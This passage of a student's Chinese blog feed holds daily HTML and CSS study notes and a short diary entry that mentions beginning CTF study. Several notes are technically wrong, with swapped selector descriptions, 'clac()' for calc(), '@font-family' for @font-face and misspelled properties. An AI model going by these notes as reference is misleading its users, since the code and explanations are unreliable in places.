title="选择器回顾+更新"></a>选择器回顾+更新</h4><pre><code>一，层级选择器+属性选择器&lt;style&gt;    .child+li&#123;                       #这个child后面的第一个同级的li标签改变        background:red;            &#125;    .child~li&#123;                       #这个后面所有同级的li标签都改变        background:red;    &#125;    div[class]&#123;                      #所有div而且有class的都改变        background:red;    &#125;    div [class]&#123;                     #加了空格，div后代有class的都改变        background:red;    &#125;    div[class=box1]&#123;                 #是div而且属性是box1的才改变        background:red;    &#125;&lt;/style&gt;拓展————模糊匹配:class^&quot;b&quot;   以b开头的class$&quot;b&quot;   以b结尾的class*&quot;b&quot;   包含b的二，结构伪类选择器&lt;style&gt;    ul li:first-child&#123;       #选择第一个        color:red;    &#125;    ul li:last-child&#123;        #最后一个        color:red;    &#125;    li:nth-child(odd)&#123;       #选定第几个，odd/2n+1/2n-1是奇数，2n/even是偶数        color:red;    &#125;    li:nth-onlychild&#123;        #匹配div下而且只有一个p的        color:red;    &#125;    div:empty&#123;               #匹配根元素(HTML)        color:red;    &#125;    :root,body&#123;              #匹配没有任何元素的，包括空格        color:red;    &#125;&lt;/style&gt;三，目标伪类选择器div.&#123;                        #先让全部使用一个style    display:none;&#125;div.:target&#123;                 #再让点到的目标换成指定的style    display:block;&#125;四，UI状态伪类选择器input:checked&#123;               #匹配选择的    background:red;  &#125;        input:focus&#123;         #匹配手动focus的    background:red;&#125;四，否定伪类选择器li:not(:nth-child(2n+1))&#123;    #匹配所有不匹配的    color:red;&#125;其它:X:link  链接伪类选择器，超链接未被访问过的X:visited  链接伪类选择器，超链接被访问过的X:active  用户行为选择器，被激活的(常用于链接)X:hover  用户行为选择器，停留在上方的</code></pre><h3 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h3><pre><code>文本阴影div&#123;    text-shadow:10px -10px 1px red;     #水平方向，垂直方向，模糊程度，阴影颜色&#125;如果要多个阴影，在颜色后面加逗号之后再加上另一个的参数，分号不要漏!!!盒子阴影div&#123;    width:100px;    ...    box-shadow: 10px(水平) 10px(垂直) 1px(模糊程度) 10px(阴影大小) red inside(内阴影);&#125;</code></pre><h3 id="圆角边框-放在style里"><a href="#圆角边框-放在style里" class="headerlink" title="圆角边框(放在style里)"></a>圆角边框(放在style里)</h3><p>同时设置四个角:<br>border-radius:10px;<br>1.从四个角往内截10px(可以使用百分比)<br>2.设置一个值，四个角一样<br>3.设置两个值，左上右下——&gt;左下右上<br>4.设置三个值，左上——&gt;左下右上——&gt;右下<br>5.设置四个值，左上开始顺时针</p><p>设置单个角:<br>boder-top-left-radius:10px;<br>boder-top-right-radius:10px;<br>boder-bottom-left-radius:10px;<br>boder-bottom-right-radius:10px;</p><p>border-radius:10px/20px;<br>水平/垂直切割，只支持boder-radius</p><h3 id="字体引入"><a href="#字体引入" class="headerlink" title="字体引入"></a>字体引入</h3><pre><code>&lt;style&gt;    @font-family:kerwin;                   #字体名字    src:url(font/STHUPO.TTF);              #字体文件路径    div&#123;        font-family:kerwin;                #字体名字        font-size:50px;               color:red;        text-shadow:5px 0px 0px green;    &#125;&lt;/style&gt;</code></pre><h3 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h3><h4 id="怪异盒模型"><a href="#怪异盒模型" class="headerlink" title="怪异盒模型"></a>怪异盒模型</h4><p>box-sizing: content-box;      #普通盒模型，增加padding时会扩张box<br>box-sizing: border-box;       #怪异盒模型，增加时不会撑大</p><h4 id="弹性盒模型-能够适应页面"><a href="#弹性盒模型-能够适应页面" class="headerlink" title="弹性盒模型(能够适应页面)"></a>弹性盒模型(能够适应页面)</h4><p>display:flex;<br>1.默认横向排列，不是浮动。<br>2.行内元素变为块级元素。<br>3.margin:auto;自动居中<br>4.flex-direction: column;<br>5.column主轴列向排列，row纵向排列;column-reverse；纵向倒序排列，row-reverse横向倒序排列<br>6.justify-content:flex-end;主轴位置<br>align-items:center;侧轴位置<br>7.flex-start靠左对齐;flex-end靠右对齐;center靠中对齐;space-around环绕;space-between两端对齐</p><h4 id="折行与行间距"><a href="#折行与行间距" class="headerlink" title="折行与行间距"></a>折行与行间距</h4><p>flex-wrap:wrap;                #打开折行<br>align-content:flex-start;      #折行之后的行间距<br>flex-start,flex-end,center,space-around,space-between同上</p><h2 id="至此，HTML与CSS结束！"><a href="#至此，HTML与CSS结束！" class="headerlink" title="至此，HTML与CSS结束！"></a>至此，HTML与CSS结束！</h2><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句:"></a>每日一句:</h5><p>&nbsp;&nbsp;每一个问题都想给出回答，也有一些想说的，想劝的，想帮的，但想到自己的生活也是一地鸡毛。<br>「我们每个人都把自己活得一团糟，却总以为可以指导别人过得更好。」<br>&nbsp;&nbsp;但说回来还是一句用烦了的话，提升自己是解决一切问题的方式，亲情爱情友情都是，在现在这个世界里，经济独立财富自由能解决百分之九十的烦恼，很现实也很真实，我文化不高总觉得词不达意，慢慢来捱过去总会越来越好的，到达谷底的人怎么走都是向上的</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恍然大悟的一天</title>
      <link href="/2022/10/31/b-13/"/>
      <url>/2022/10/31/b-13/</url>
      
        <content type="html"><![CDATA[<p>好久没更新了<br>不是不想写，而是真的没时间写。<br>因为大学牲……</p><p>——————————卑微的分割线——————————</p><p>首先简述一下过去一个月的收获<br>1.当然是搭建了这个HexoBlog啦！！！虽然有人吐槽简陋而且没有服务器，但是这终归是我自己搭建的我所喜欢的博客。<br>  所以，请不要随意评论我的Blog哦~~<br>2.简简单单地学习了HTML和CSS，大概能够手搓一个非常非常简单的前端页面了<br>3.入门了CTF，这也是我这一个月所有忙活的目标。<br>  在这一个月里，经过无数次的磕磕碰碰，付出了无数的精力后，从一个完完全全的小白蜕变成了能够自己觅食寻找出路的初学者<br>4.参加了各种各样的社团面试和活动，每天都安排得满满的真的很累</p><p>然后再说一下未来的目标<br>1.肯定是继续学习前端JS还有后端PHP<br>2.写题啥的先放一下，因为靠写题来学习知识效率太低了<br>3.努力学好高数和线代……(希望)<br>4希望能够加入方班预备班？？？不是，咋我刚写下来就发通知通过了？？？</p><p>最后唠嗑两句<br>想结果的花，都早早低头;时人不识凌云木，直待凌云始道高。</p><p>—————————还是卑微的分割线—————————</p><p>附:<br>欢迎来看看我的<a href="https://gitmind.cn/app/doc/48spll2fph">笔记</a> ——&gt; 问题很多所以就看个乐子，保质期一个月<br><em><strong>嗯，没错，已经失效了</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML&amp;CSS拓展（5）</title>
      <link href="/2022/10/20/b-12/"/>
      <url>/2022/10/20/b-12/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h3><p>用a链接跳转到不同区域</p><pre><code>&lt;a href=&quot;#lianjie&quot;&gt;内容&lt;/a&gt;&lt;div id=&quot;a&quot;&gt;    内容&lt;/div&gt;点击a链接时跳到div中去</code></pre><h3 id="精灵图-图片整合技术"><a href="#精灵图-图片整合技术" class="headerlink" title="精灵图(图片整合技术)"></a>精灵图(图片整合技术)</h3><p>1.先将所有图片和为一个图<br>2.使用background-position来移动位置显示出</p><h3 id="宽高自适应"><a href="#宽高自适应" class="headerlink" title="宽高自适应"></a>宽高自适应</h3><p>定义:元素自动调整大小<br>1.定义宽高时为auto，元素的量决定宽高<br>2.min-height:10px;最小10px，多于10px就变大<br>问题:父元素不写高度时，子元素写了浮动，父元素会高度塌陷<br>1.声明<br>overflow:hidden;<br>2.浮动元素下加块元素并声明<br>clear:both; height:0; overflow:hidden;<br>3.清除浮动<br>after{content:””,clear:both; display:block; height:0; visibility:hidden;/overflow:hidden;}</p><h3 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h3><pre><code>div::first-letter&#123;          #定义第一个字符的样式    font-size:30px;    color:red;&#125;div::first-line&#123;&#125;           #定义第一行的样式div::after&#123;content:内容&#125;    #放在对象后的内容div::before&#123;content:内容&#125;   #放在对象前的内容</code></pre><h3 id="注意-隐藏的区别"><a href="#注意-隐藏的区别" class="headerlink" title="注意(隐藏的区别)"></a>注意(隐藏的区别)</h3><p>display:none(不占位)<br>visibility:hidden(占位)</p><h3 id="窗口自适应"><a href="#窗口自适应" class="headerlink" title="窗口自适应"></a>窗口自适应</h3><pre><code>1.单一栏目html,body&#123;    height:100%;             #所有盒子根据窗口的大小变化&#125;2.两栏布局(A)使用盒子的外边距&lt;style&gt;    .box1&#123;        height:100%;        ...        margin-left:200px;     #使一个盒子空出空间(外边距)    &#125;    .box2&#123;        height:100%;        ...        float:left;            #另一个盒子往另一边靠    &#125;&lt;/style&gt;(B)使用clac()函数计算长度值注意:可以使用加减乘除，而且运算符号前后都要加一个空格&lt;style&gt;    .box1&#123;        height:100%;        width:clac(100% - 200px);     #根据屏幕窗口的变化而改变        float:left;     &#125;    .box2&#123;        height:100%;        width:100px;         float:left;     &#125;&lt;/style&gt;3.三栏布局(A)1.先html,body&#123;&#125;全部统一变化2.left和right浮动3.center设置左右外边距4.先让左右浮动再插入center(B)同上，要在center加入clac函数</code></pre><h5 id="表单进阶"><a href="#表单进阶" class="headerlink" title="表单进阶"></a>表单进阶</h5><h3 id="单选框"><a href="#单选框" class="headerlink" title="单选框"></a>单选框</h3><pre><code>&lt;body&gt;    &lt;div&gt;性别&lt;/div&gt;                                        #定义标题    &lt;div&gt;        &lt;input type=&quot;radio&quot; name=&quot;1&quot; id=&quot;man&quot;&gt;            #radio是选框样式，name是一个组，id表示标记        &lt;label for=&quot;man&quot;&gt;男&lt;/label&gt;                       #label是说明标签，for是定位到上面的id    &lt;/div&gt;    &lt;div&gt;        &lt;input type=&quot;radio&quot; name=&quot;1&quot; id=&quot;woman&quot;&gt;        &lt;label for=&quot;woman&quot;&gt;女&lt;/label&gt;    &lt;/div&gt;&lt;/body&gt;注意:1.如果没有定义name(组)会变成多选2.如果要默认选中，在input中加上checked=&quot;checked&quot;，也可以直接写checked</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>人不该惧怕孤独，因为出生前，造物主就用孤独考验过每个人，哪里还能比在胚胎中更孤独呢？</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML&amp;CSS拓展（4）</title>
      <link href="/2022/10/19/b-11/"/>
      <url>/2022/10/19/b-11/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h3><pre><code>1.默认值position:static;2.绝对定位position:absolute;top:100px;left:-20px;脱离原始位置,但是原始位置占位，参照物是父元素或浏览器第一屏(没有父元素时)注:通常与相对定位相结合使用3.相对定位position:relative;top:100px;left:-20px;不脱离原始位置，但是原始位置不占位(类似于浮动),相对于原始位置4.固定定位position:fixed;top:100px;left:-20px;脱离原始位置，固定在浏览器窗口5.粘性定位position:sticky;top:0px;吸顶效果，需要定义距离边框的距离，css3.0新增附加:透明度&lt;style&gt;    p&#123;        opacity:0;        #0是完全透明，1是不透明    &#125;&lt;/style&gt;</code></pre><h3 id="三角形模型"><a href="#三角形模型" class="headerlink" title="三角形模型"></a>三角形模型</h3><pre><code>.box&#123;                                          #标准style    width:0px;                                 #定义盒子模型基本属性    height:0px;    border:20px solid transparent;             #四周全部透明    border-bottom:20px solid red;              #单边不透明，重合部分五五分显示颜色，这样子可以显示为三角形    position:relative;                         #相对盒子模型定位    bottom:2.5px;                              #移动至中间(美观)&#125;.box:hover span&#123;                               #悬浮时的style    width:0px;    height:0px;    border:20px solid transparent;    border-top:20px solid red;    position:relative;    top:2.5px;&#125;</code></pre><h3 id="定位的层级"><a href="#定位的层级" class="headerlink" title="定位的层级"></a>定位的层级</h3><p>父子关系时<br>z-index越大越靠上显示</p><h3 id="绝对定位深入探索"><a href="#绝对定位深入探索" class="headerlink" title="绝对定位深入探索"></a>绝对定位深入探索</h3><p>1.<br>兄弟关系时，后来者居上，后面的再上层<br>2.<br>行内元素转化为块元素<br>绝对定位法:定义absolute</p><pre><code>    &lt;style&gt;        span&#123;            width:            ...            poosition:absolute;        &#125;    &lt;/style&gt;&lt;body&gt;    &lt;span&gt;        内容    &lt;/span&gt;&lt;/body&gt;直接转化法:display:block;浮动法:float:left;</code></pre><h3 id="水平垂直居中"><a href="#水平垂直居中" class="headerlink" title="水平垂直居中"></a>水平垂直居中</h3><p>1.先定义absolute<br>2.设定宽高位置50%<br>3.移动-px至中间<br>4.注意是相对于哪个盒子</p><h3 id="定位与浮动的区别"><a href="#定位与浮动的区别" class="headerlink" title="定位与浮动的区别"></a>定位与浮动的区别</h3><p>有文字时:<br>浮动半脱离(文字环绕效果)<br>abslote全脱离(无环绕效果)</p><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>想结果的花， 都早早低头。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML&amp;CSS拓展（3）</title>
      <link href="/2022/10/18/b-10/"/>
      <url>/2022/10/18/b-10/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="溢出属性"><a href="#溢出属性" class="headerlink" title="溢出属性"></a>溢出属性</h3><p>overflow:visible全部显示,hidden不显示溢出的,scroll滑动一直存在,auto自动<br>overflow:inherit继承父元素的效果<br>单一方向显示<br>overflow-x:auto;<br>overflow-y:hidden;<br>一定要定义x和y</p><h3 id="空余空间"><a href="#空余空间" class="headerlink" title="空余空间"></a>空余空间</h3><pre><code>white-space:normal;        #normal无视空白，nowrap不换行直到br标签，pre，pre-wrap,pre-linepre标签是预格式化文本，保留空格tab回车pre保留空白，pre-wrap折行但是保留空白，pre-line保留空白不换行</code></pre><h3 id="溢出省略号"><a href="#溢出省略号" class="headerlink" title="溢出省略号"></a>溢出省略号</h3><pre><code>width:2000px;                     #一定要定义宽度white-space:nowrap;               #不换行overflow:hidden;                  #隐藏溢出的部分text-overflow:ellipsis;           #若溢出则在最后显示省略号</code></pre><h3 id="元素显示类型"><a href="#元素显示类型" class="headerlink" title="元素显示类型"></a>元素显示类型</h3><p>1.块元素(display:block或list-item)<br>例:p,div,h标签<br>A）块状元素在网页中就是以块的形式显示，快状就是元素显示为矩形区域，<br>B）默认情况下，块状元素都会占据一行，会按顺序自上而下排列。<br>C）块状元素都可以定义自己的宽度和高度<br>D）块状元素一般都作为其他元素的容器，它可以容纳其它内联元素和其它块状元素。<br>E）p标签只能放文本不能放块级元素（div等）<br>2.行内(内联)元素(display:inline)<br>例:a,b,em,i,span,strong标签<br>A）在同一行排列<br>B）无法设置宽高，只能默认<br>3.行内块元素(display:inline-block)<br>例:img,input标签<br>A）可以设置宽高<br>B）同行排列</p><p>注意<br>span行内元素只支持左右边距，不支持上下边距<br>行内块支持</p><h3 id="元素类型相互转换"><a href="#元素类型相互转换" class="headerlink" title="元素类型相互转换"></a>元素类型相互转换</h3><p>直接在style里display:block;进行转换</p><h3 id="设置鼠标悬浮时显示，否则隐藏"><a href="#设置鼠标悬浮时显示，否则隐藏" class="headerlink" title="设置鼠标悬浮时显示，否则隐藏"></a>设置鼠标悬浮时显示，否则隐藏</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        .hide&#123;                      #隐藏界面(不显示内容)            display:none;        &#125;        .box:hover ul&#123;              #在hover时显示块元素(block是原本的style)            display:block;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;hide&quot;&gt;        111111111111    &lt;/div&gt;    &lt;div class=&quot;box&quot;&gt;        内容1        &lt;ul class=&quot;hide&quot;&gt;            &lt;li&gt;11111&lt;/li&gt;            &lt;li&gt;22222&lt;/li&gt;            &lt;li&gt;33333&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="二级菜单案例《重点》"><a href="#二级菜单案例《重点》" class="headerlink" title="二级菜单案例《重点》"></a>二级菜单案例《重点》</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        *&#123;            padding:0;                       #先对整个页面布局            margin:0;        &#125;        .box&#123;            width:300px;            margin:0 auto;        &#125;        ul&#123;                                  #不悬浮时不显示            list-style:none;        &#125;        .box .item&#123;            float:left;            width:148px;                     #前面提到的要减去boder的宽度，因为计算的是加上boder的            text-align:center;            border:1px solid blue;            background:blue;            color:white;            line-height:40px;        &#125;        .item:hover&#123;            color:lightblue;        &#125;        .item&gt;ul&#123;                            # &gt;是选择器，选择子代的而不会选择到父代的ul标签            display:none;            background:white;            color:black;        &#125;        .item:hover ul&#123;                      #hover时恢复原本的块元素属性            display:block;        &#125;        .item li:hover&#123;                      #注意是hover在谁的时候显示变化            color:blue;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul class=&quot;box&quot;&gt;        &lt;li class=&quot;item&quot;&gt;aaaaaaaaaaaa        #第一个一级菜单            &lt;ul&gt;                &lt;li&gt;111&lt;/li&gt;                &lt;li&gt;222&lt;/li&gt;                 #第一个二级菜单                &lt;li&gt;333&lt;/li&gt;                &lt;li&gt;444&lt;/li&gt;            &lt;/ul&gt;        &lt;/li&gt;        &lt;li class=&quot;item&quot;&gt;bbbbbbbbbbbb        #第二个一级菜单            &lt;ul&gt;                &lt;li&gt;pmp&lt;/li&gt;                &lt;li&gt;红帽&lt;/li&gt;                #第二个二级菜单            &lt;/ul&gt;        &lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="每日一悟"><a href="#每日一悟" class="headerlink" title="每日一悟"></a>每日一悟</h5><p>1.有几个模块就方济各div标签(header，导航nav，list，footer)<br>2.一定要注意减去宽度<br>3.共同的属性发放在一起成为标签，如宽度<br>4.为了美观和简单布局，建议引入css文件</p><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>迷路，并无小路大路短路长路之区别。不能说在大路长路上迷路就不是迷路了。走在达不到目的的路上，就是迷路。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML&amp;CSS拓展（2）</title>
      <link href="/2022/10/16/b-9/"/>
      <url>/2022/10/16/b-9/</url>
      
        <content type="html"><![CDATA[<h6 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h6><h3 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h3><pre><code>1.外边距    &lt;style&gt;        div&#123;            padding:30px;               /* 一个值4个方向一样，两个值上下和左右，三个值上和左右和下，四个值上右下左 */            padding-left:0px;           /* 对单一方向更改 */        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;        111111111111111111    &lt;/div&gt;&lt;/body&gt;注意:1.上下两个box时外边距取大值2.左右两个box加和3.有父子两个box时，子盒子加外边距会整体移动解决:1.加浮动  2.overflow:hidden.2.边框&lt;style&gt;    .box1&#123;        border-top:10px dotted red;             #solid实线double双实线dashed虚线dotted点状线，可以选择单一方向更改        margin:10px auto;                       #用法同上，左边是纵向，右边是横向，auto是居中    &#125;&lt;/style&gt;注意:实际上的编写会有3px的误差，来源于图片标签的图片和文字间类型不同，需要转换:img&#123;    display:block;&#125;</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>迷路，并无小路大路短路长路之区别。不能说在大路长路上迷路就不是迷路了。走在达不到目的的路上，就是迷路。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML&amp;CSS拓展（1）</title>
      <link href="/2022/10/14/b-8/"/>
      <url>/2022/10/14/b-8/</url>
      
        <content type="html"><![CDATA[<h6 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h6><h3 id="列表属性-在列表前加元素"><a href="#列表属性-在列表前加元素" class="headerlink" title="列表属性(在列表前加元素)"></a>列表属性(在列表前加元素)</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;ul&#123;        list-style-type:none;                    /* disc实心圆 circle空心圆 square实心正方形 none无 */        list-style-image:url(地址);              /* 这样子是全部都使用这种style的，否则要在li前加class */        list-style-position: outside;            /* outside把上面的元素放在盒子外面，inside放在里面 */        &#125;        .p1&#123;            list-style:none url(地址) inside;    /* 复合属性写法 */        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul&gt;        &lt;li class=&quot;p1&quot;&gt;            内容        &lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="背景属性"><a href="#背景属性" class="headerlink" title="背景属性"></a>背景属性</h3><p>用法和字体颜色一样</p><pre><code>在style下对标签定义width,height,background-color:rgba(255,0,0,0.5)    #rgba是透明对于插入的图片:background-image: url(地址);                                     #默认平铺，图片太大裁剪，太小复制background-repeat: repeat;                                       #repeat默认，repeat-x是x轴平铺，repeat-y是y轴平铺，no-repeat不平铺background-position:10px 10%;                                    #图片放置的位置，左边是横向右边是纵向，%是相对于盒子的background-position:right center;                                #左边是横向右边是纵向background-size:400px 100%;                                      #左边是横向右边是纵向(会失真)，cover(完全覆盖但是可能无法全部显示)，contain(图片全部展示但是会留白)background-attachment: fixed;                                    #fixed固定在浏览器视窗内，scroll滚动，如果没有div会不显示复合写法background:   ;不看顺序注意:background-size要单独放</code></pre><h3 id="浮动属性"><a href="#浮动属性" class="headerlink" title="浮动属性"></a>浮动属性</h3><pre><code>float:left;         #并排靠左排列，太多换行float:right;        #和左对称浮动的会覆盖未浮动的(因为float的没有高度)文字不能被挡住，放在上层防止高度塌陷(防止覆盖)1.div内固定高度，令其有高度2.清浮动clear:left/right/both/none3.当前浮动元素后补一个盒子，不设置宽高，clear:both4.overflow:hidden;(使浮动元素计算高度)</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>人，归根结底，是一个物质存在，很容易受损伤，却不容易修复。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS基础（2）</title>
      <link href="/2022/10/12/b-7/"/>
      <url>/2022/10/12/b-7/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h3><pre><code>font-size        字体大小     单位是px，浏览器默认是16px,设计图常用字号是12pxfont-family      字体         当字体是中文字体、英文字体中有空格时，需加双引号                               多个字体中间用逗号链接,先解析第1个字体,如果没有解析第2个字体，以此类推 color            颜色         color:red;color:#ff0；color:rgb(255,0,0)；0-255 font-weight      加粗         font-weight:bolder(更粗的)/bold（加粗）/normal（常规）                               font-weight:100-900；100-500不加粗 600-900加粗 font-style       倾斜         font-style:italic(斜体字)/oblique(oblique倾斜的文字)/normal（常规显示）；text-align       文本水平对齐  text-align: left;       水平靠左                              text-align：right;     水平靠右                               text-align：cente;     水平居中                               text-align: justify;    水平2端对齐，但是只对多行起作用text-transform   单词大小写    uppercase全部大写,lowercase全部小写,none无定义,capitalize首字母大写样例&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        .p1&#123;            font-size:13px;        &#125;        .p2&#123;            font-family:宋体,等等等;    #逗号间隔，从左到右依次使用        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;p class=&quot;p1 p2&quot;&gt;        内容    &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>字体总结:<br>宋体 SimSun<br>黑体 SimHei<br>微软雅黑 Microsoft YaHei<br>微软正黑体 Microsoft JhengHei<br>新宋体 NSimSun<br>新细明体 PMingLiU<br>细明体 MingLiU<br>标楷体 DFKai-SB<br>仿宋 FangSong<br>楷体 KaiTi<br>仿宋 _GB2312 FangSong_GB2312<br>楷体 _GB2312 KaiTi_GB2312</p><h3 id="字体颜色"><a href="#字体颜色" class="headerlink" title="字体颜色"></a>字体颜色</h3><p>1.<br>color:rgb(255,0,0)<br>0最弱255最强<br>2.<br>十六进制0<del>9，A</del>F<br>color:ffffff    #每两个对应上面的一组，0是最弱f是最强，相同的可以只写一次</p><h3 id="文本修饰"><a href="#文本修饰" class="headerlink" title="文本修饰"></a>文本修饰</h3><pre><code>line-height          行高        line-height的数据=height的数据，可以实现单行文本垂直居中 text-indent          首行缩进    text-indent可以取负值； text-indent属性只对第一行起作用 letter-spacing       字间距      控制文字和文字之间的间距 text-decoration      文本修饰    text-decoration:  none没有/underline下划线/overline上划线/line-through删除线 font                 文字简写    font是font-style  font-weight font-size/line-height font-family的简写。                                 font:italic 800 30px/80px&quot;宋体”;   注意！！！对于font————顺序不能改变,必须同时指定font-size和font-family属性时才起作用</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>问什么有时候比答什么更能表露说话人的心。————张北海</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS基础（1）</title>
      <link href="/2022/10/09/b-6/"/>
      <url>/2022/10/09/b-6/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><p>1.含义:如何修饰网页信息的显示样式<br>2.语法<br> 1）每个CSS样式由两部分组成，即选择符和声明，声明又分为属性和属性值。<br> 2）属性必须放在花括号中，属性与属性值用冒号连接。<br> 3）每条声明用分号结束。<br> 4）当一个属性有多个属性值的时候，属性值与属性值不分先后顺序，用空格隔开。<br> 5）在书写样式过程中，空格、换行等</p><h2 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h2><pre><code>第一&lt;style&gt;    h1&#123;color:red;&#125;&lt;/style&gt;放head和body都可以第二&lt;body&gt;    &lt;h1 style=&quot;color:red;&quot; &gt;内容&lt;/h1&gt;&lt;/body&gt;</code></pre><h2 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h2><pre><code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; herf=&quot;css文件所在的地址&quot;&gt;       #注意是rel&lt;style&gt;    @import url(css文件所在的地址);                                    #注意分号&lt;style&gt;两种，最好放head标签里</code></pre><h2 id="扩展知识点"><a href="#扩展知识点" class="headerlink" title="扩展知识点"></a>扩展知识点</h2><p>link和import之间的区别？<br>①差别1：本质的差别：link属于XHTML标签，而@import完全是CSS提供的一种方式。<br>②差别2：加载顺序的差别：link引用的CSS会同时被加载，而@import引用的CSS会等到页面全部被下载完再被加载。所以有时候浏览@import加载 CSS的页面时开始会没有样式（就是闪烁），网速慢的时候还挺明显。<br>③差别3：兼容性的差别：@import老的浏览器不支持，而link标签无此问题。<br>样式表优先级<br>原则:就近原则————!important（放在属性值后）&gt;行内&gt;内部&gt;外部           #注意感叹号</p><h3 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h3><p>1.class类选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta 